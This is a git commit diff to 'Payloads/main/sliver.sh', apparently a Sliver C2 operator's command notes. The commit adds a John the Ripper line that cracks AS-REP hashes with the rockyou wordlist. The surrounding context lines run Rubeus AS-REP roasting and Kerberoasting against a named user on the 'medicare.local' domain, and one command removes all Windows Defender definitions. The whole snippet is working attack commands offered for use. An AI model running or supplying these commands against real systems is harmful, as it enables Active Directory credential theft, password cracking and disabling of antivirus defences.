22f28e7c230055a0abcc5367bf996be6722a30ae
Cazeho <58745332+Cazeho@users.noreply.github.com>
2025-02-18 18:25:01 +0100

    Update sliver.sh

--- Payloads/main/sliver.sh
+++ Payloads/main/sliver.sh
@@ -59,3 +59,5 @@ rubeus asreproast /user:allegra.dosi /domain:medicare.local /dc:medicare.local
 rubeus kerberoast /spn:http_svc /domain:medicare.local /dc:dc.medicare.local /user:allegra.dosi
 ## diable AV
 execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+## dehash asrep
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep hash
